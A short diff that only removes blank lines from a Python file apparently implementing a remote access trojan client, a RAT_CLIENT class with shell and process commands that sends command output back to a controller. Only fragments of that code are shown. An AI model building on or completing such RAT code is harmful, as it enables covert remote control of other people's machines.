@@ -15,10 +15,6 @@ class Command(Enum):
     SHELL = b'1'
     PROC = b'2'
     EXIT = b'3'
-     
-    
-    
-
 
 
 class RAT_CLIENT:
@@ -116,10 +112,6 @@ class RAT_CLIENT:
                     msg += result.stderr
                 self.send_buf.put(msg.encode())
                 
-        
-                    
-        
-            
             
     
 if __name__ == "__main__":
